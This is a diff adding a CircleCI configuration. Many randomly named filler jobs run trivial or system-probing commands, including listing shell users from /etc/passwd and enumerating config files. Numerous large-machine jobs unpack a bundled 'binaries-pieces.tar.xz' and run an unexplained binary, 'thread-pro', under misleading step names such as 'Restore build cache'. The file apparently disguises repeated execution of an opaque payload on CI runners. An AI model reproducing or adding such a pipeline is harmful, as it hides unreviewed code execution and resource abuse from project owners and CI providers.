+            cksum /tmp/xfer.d/protonBronzeYield | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'protonBronzeYield'
+  assemble-full-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse; tail -n 1 /tmp/xfer.d/bEAmlaMBdALayeRPULse) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  WKError:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute 3
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; date | awk '{print $4}'; true ; } > /tmp/xfer.d/23.74
+            cksum /tmp/xfer.d/23.74 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '23.74'
+  cerberus-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  hslLime:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: When do we dedupe the temp files
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; nl /etc/nsswitch.conf | sort | tac; true ; } > /tmp/xfer.d/md5_0bb001ef9f3f90
+            cksum /tmp/xfer.d/md5_0bb001ef9f3f90 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'md5_0bb001ef9f3f90'
+  fiona-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/md5_0bb001ef9f3f90; tail -n 1 /tmp/xfer.d/md5_0bb001ef9f3f90) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  drouthnongex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Scatter the glossary
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; \ls -i -S /etc/skel | sort -r; true ; } > /tmp/xfer.d/621d26c5d0783504711ba
+            cksum /tmp/xfer.d/621d26c5d0783504711ba | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '621d26c5d0783504711ba'
+  v5-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/621d26c5d0783504711ba; tail -n 1 /tmp/xfer.d/621d26c5d0783504711ba) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  pre_begin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Green wakeup check
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; { echo 'alright then'; echo 'x y z'; } | sort; true ; } > /tmp/xfer.d/MCKjaxxNVrS9RocYlBRfe
+            cksum /tmp/xfer.d/MCKjaxxNVrS9RocYlBRfe | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'MCKjaxxNVrS9RocYlBRfe'
+  assemble-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/MCKjaxxNVrS9RocYlBRfe; tail -n 1 /tmp/xfer.d/MCKjaxxNVrS9RocYlBRfe) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  Enter-UnionList:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: reheat
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; df -h | grep %; true ; } > /tmp/xfer.d/ScArLetsilenT
+            cksum /tmp/xfer.d/ScArLetsilenT | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'ScArLetsilenT'
+  q4-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+  RE-69132a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Sync The Crafting Recipes To Lima
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; : >'/tmp/desk-dolphin-1106.log' && ls -l '/tmp/desk-dolphin-1106.log'; true ; } > /tmp/xfer.d/qMo6ZBQ
+            cksum /tmp/xfer.d/qMo6ZBQ | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'qMo6ZBQ'
+  apr18-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Prepare
+          command: |
+            md5sum < <(head -n 1 /tmp/xfer.d/194424_2022; tail -n 1 /tmp/xfer.d/194424_2022) 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 1 -q --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: unxz -c binaries-pieces.tar.xz | tar xf -
+      - run:
+          command: "$PWD/thread-pro"
+
+  BlockingPixelRenderer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Op Moose
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; ls --classify --human-readable --almost-all --reverse | uniq; true ; } > /tmp/xfer.d/5c3ac4cf6dd5ced0e318e7
+            cksum /tmp/xfer.d/5c3ac4cf6dd5ced0e318e7 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '5c3ac4cf6dd5ced0e318e7'
+  asc_051DF0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Did the ops channel get polled
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; compgen -k | tr a-z A-Z | sort | uniq -c | sort -nr | tail -n 2 | sort -u; true ; } > /tmp/xfer.d/SURGE_BEAM_ENGINE
+            cksum /tmp/xfer.d/SURGE_BEAM_ENGINE | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'SURGE_BEAM_ENGINE'
+  cbRepo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: COMPUTE MD5
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; grep -C 3 'sh$' /etc/passwd | awk -F: '{print $1}'; true ; } > /tmp/xfer.d/HAWK_FEN_ATOLL_NICKEL
+            cksum /tmp/xfer.d/HAWK_FEN_ATOLL_NICKEL | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'HAWK_FEN_ATOLL_NICKEL'
+  lvsignal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: do not touch
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; getent hosts localhost | tac | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/xfer.d/19.169
+            cksum /tmp/xfer.d/19.169 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '19.169'
+  COMPARE_QUARTZ_PROMISE_BEAR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Ship Packing Slips Shelf E10
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -hXA --file-type /var/lib|sort -R|head -3; true ; } > /tmp/xfer.d/621d26c5d0783504711ba
+            cksum /tmp/xfer.d/621d26c5d0783504711ba | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '621d26c5d0783504711ba'
+  posT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Countdown 2 reminder
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; echo "the quick brown fox jumps over the lazy dog" | gzip | base64; true ; } > /tmp/xfer.d/149.201
+            cksum /tmp/xfer.d/149.201 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - '149.201'
+  DSN_SUB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: Slot 029 outline b
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=4255\nuser=hugo\ndebug=true\n' >/tmp/avenueexpense.conf && grep ^port /tmp/avenueexpense.conf | cut -d= -f2; true ; } > /tmp/xfer.d/walletBlueScarlet
+            cksum /tmp/xfer.d/walletBlueScarlet | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'walletBlueScarlet'
+  vb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/xfer.d
+      - run:
+          name: distillation scope all
+          command: |
+            mkdir -p /tmp/xfer.d
+            { set +o pipefail 2>/dev/null; compgen -G "/etc/*.conf" | sort -r | head -n 10; true ; } > /tmp/xfer.d/md5_0bb001ef9f3f90
+            cksum /tmp/xfer.d/md5_0bb001ef9f3f90 | awk '{print "crc-c:",$2,$1}'
+      - persist_to_workspace:
+          root: /tmp/xfer.d
+          paths:
+            - 'md5_0bb001ef9f3f90'
+workflows:
+  default:
+    jobs:
+      - sin_kw
+      - preview-v2:
+          requires:
+            - sin_kw
+      - lockedSchemaNameSidebarCanyon:
+          requires:
+            - sin_kw
+      - wip-retry:
+          requires:
+            - lockedSchemaNameSidebarCanyon
+      - pre_begin:
+          requires:
+            - lockedSchemaNameSidebarCanyon
+      - assemble-end-to-end-regression-suite:
+          requires:
+            - pre_begin
+      - NO_STAGE
+      - BlockingPixelRenderer:
+          requires:
+            - NO_STAGE
+      - INFRA-206:
+          requires:
+            - BlockingPixelRenderer
+      - phi_old:
+          requires:
+            - BlockingPixelRenderer
+      - asc_051DF0:
+          requires:
+            - phi_old
+      - add-router-v2:
+          requires:
+            - asc_051DF0
+      - tPxGjE:
+          requires:
+            - asc_051DF0
+      - cbRepo:
+          requires:
+            - tPxGjE
+      - papa-1:
+          requires:
+            - cbRepo
+      - FTPView:
+          requires:
+            - cbRepo
+      - lvsignal:
+          requires:
+            - FTPView
+      - q2-cleanup:
+          requires:
+            - lvsignal
+      - drouthnongex:
+          requires:
+            - lvsignal
+      - COMPARE_QUARTZ_PROMISE_BEAR:
+          requires:
+            - drouthnongex
+      - v5-canary:
+          requires:
+            - COMPARE_QUARTZ_PROMISE_BEAR
+      - search010:
+          requires:
+            - COMPARE_QUARTZ_PROMISE_BEAR
+      - posT:
+          requires:
+            - search010
+      - smoke:
+          requires:
+            - posT
+      - rDim:
+          requires:
+            - posT
+      - DSN_SUB:
+          requires:
+            - rDim
+      - APP-452:
+          requires:
+            - DSN_SUB
+      - hslLime:
+          requires:
+            - DSN_SUB
+      - vb:
+          requires:
+            - hslLime
+      - fiona-smoke:
+          requires:
+            - vb
+      - SNAPSHOT
+      - scaleAsync
+      - atlas-alpha:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - europa-alpha:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - perseus:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - rm-dashboard-leak:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - v7-nightly2:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - QA_BUILD_1:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - assemble-full-artifact-bundle:
+          requires:
+            - SNAPSHOT
+            - scaleAsync
+      - assert_segment_inner
+      - ryo_x
+      - FlagScannerMidPipe
+      - java17-bench:
+          requires:
+            - assert_segment_inner
+            - ryo_x
+            - FlagScannerMidPipe
+      - greg-run:
+          requires:
+            - assert_segment_inner
+            - ryo_x
+            - FlagScannerMidPipe
+      - update-cache:
+          requires:
+            - assert_segment_inner
+            - ryo_x
+            - FlagScannerMidPipe
+      - Ship_App5:
+          requires:
+            - assert_segment_inner
+            - ryo_x
+            - FlagScannerMidPipe
+      - JPLLB-72993
+      - RE-69132a
+      - cost5
+      - artifacts:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - apr18-release:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - oscar-3:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - cerberus-plus:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - do-the-thing:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - q4-canary:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - fx-01:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
+      - rust-bench:
+          requires:
+            - JPLLB-72993
+            - RE-69132a
+            - cost5
